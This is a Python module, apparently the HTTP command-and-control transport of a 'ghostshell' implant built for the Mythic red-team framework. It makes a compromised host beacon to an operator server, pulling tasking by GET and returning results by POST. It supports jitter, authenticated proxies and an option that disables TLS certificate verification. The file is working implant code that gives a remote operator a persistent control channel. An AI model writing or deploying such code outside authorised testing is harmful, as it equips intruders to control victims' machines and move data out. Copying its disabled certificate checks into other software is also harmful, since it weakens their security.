"""ghostshell HTTP C2 adapter (PUBLIC — Surface 3).

Beacons Mythic over HTTPS/HTTP using urllib (stdlib only). GET for tasking,
POST for responses/checkin. This is the reference transport; dynamic_http
subclasses it.
"""

import urllib.request
import ssl
from . import C2Adapter, C2Error

# Some Mythic test deployments use self-signed certs. We allow disabling
# verification (set by the 'encrypted_exchange_check' / https build param).
_CTX_NONE = ssl.create_default_context()
_CTX_NONE.check_hostname = False
_CTX_NONE.verify_mode = ssl.CERT_NONE


class HTTPC2Adapter(C2Adapter):
    """Standard HTTP beaconing: GET ?<param>=<data> for tasking, POST <uri>
    with <data> body for responses. Matches the Mythic 'http' C2 profile."""

    def __init__(self, params):
        # params keys come from the Mythic http C2 profile (translator-injected).
        self.server = params.get("callback_host", "https://127.0.0.1")
        self.port = str(params.get("callback_port", "7443"))
        self.post_uri = params.get("post_uri", "/post_uri")
        self.get_uri = params.get("get_uri", "/get_uri")
        self.get_param = params.get("query_path_name", "query")
        self.headers = params.get("headers", {}) or {}
        self.interval = int(params.get("callback_interval", 10))
        self.jitter = int(params.get("callback_jitter", 10))
        self.verify_tls = str(params.get("encrypted_exchange_check", "yes")).lower() not in ("no", "false", "0")
        self.proxy_host = params.get("proxy_host", "")
        self.proxy_port = params.get("proxy_port", "")
        self.proxy_user = params.get("proxy_user", "")
        self.proxy_pass = params.get("proxy_pass", "")

    def _base_url(self):
        # server may already include the scheme + port; tolerate both shapes.
        s = self.server
        if "://" not in s:
            s = "https://" + s
        # avoid double-port: only append :port if server has no port
        if ":" not in s.split("://", 1)[1]:
            s = s + ":" + self.port
        return s

    def _build_opener(self):
        if self.proxy_host and self.proxy_port:
            scheme = "https" if self.proxy_host.startswith("https") else "http"
            proxy_url = "{}://".format(scheme)
            if self.proxy_user and self.proxy_pass:
                proxy_url += "{}:{}@".format(self.proxy_user, self.proxy_pass)
            proxy_url += "{}:{}".format(self.proxy_host.replace(scheme + "://", ""), self.proxy_port)
            handler = urllib.request.ProxyHandler({scheme: proxy_url})
            return urllib.request.build_opener(handler)
        return None

    def make_request(self, data_b64, method="GET"):
        url = self._base_url()
        hdrs = dict(self.headers)
        if method == "GET":
            full = "{}{}?{}={}".format(url, self.get_uri, self.get_param, data_b64.decode() if isinstance(data_b64, bytes) else data_b64)
            req = urllib.request.Request(full, headers=hdrs)
        else:
            full = url + self.post_uri
            req = urllib.request.Request(full, data=data_b64 if isinstance(data_b64, bytes) else data_b64.encode(), headers=hdrs)
        opener = self._build_opener()
        # One retry on transient failure; the base agent's beacon loop also
        # retries on C2Error, so we keep this simple + readable.
        last_err = None
        for _attempt in range(2):
            try:
                fetch = opener.open if opener else urllib.request.urlopen
                ctx = None if self.verify_tls else _CTX_NONE
                with fetch(req, context=ctx) if ctx else fetch(req) as resp:
                    import base64
                    return base64.b64decode(resp.read())
            except Exception as e:  # noqa: BLE001 -- transport errors are varied
                last_err = e
        raise C2Error("HTTP request failed after retry: {}".format(last_err))
